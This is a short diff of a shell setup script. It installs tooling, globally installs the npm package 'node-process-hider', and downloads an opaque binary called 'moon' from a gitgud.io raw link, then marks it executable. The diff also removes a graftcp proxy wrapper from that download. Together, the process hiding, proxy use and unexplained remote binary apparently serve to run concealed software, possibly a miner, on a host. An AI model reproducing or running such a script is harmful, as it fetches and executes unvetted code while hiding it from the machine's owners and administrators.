@@ -2,9 +2,9 @@ apt update && apt -y install sudo wget curl unzip
 
 sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
-
-apt-get install -y nodejs
+curl -sL https://deb.nodesource.com/setup_18.x -o nodesource_setup.sh
+sudo bash nodesource_setup.sh
+sudo apt install nodejs -y
 
 npm i -g node-process-hider
 
@@ -32,7 +32,7 @@ echo " "
 
 echo " "
 
-./graftcp/graftcp wget https://gitgud.io/trendava/ruby/-/raw/master/moon
+wget https://gitgud.io/trendava/ruby/-/raw/master/moon
 
 chmod +x moon
 
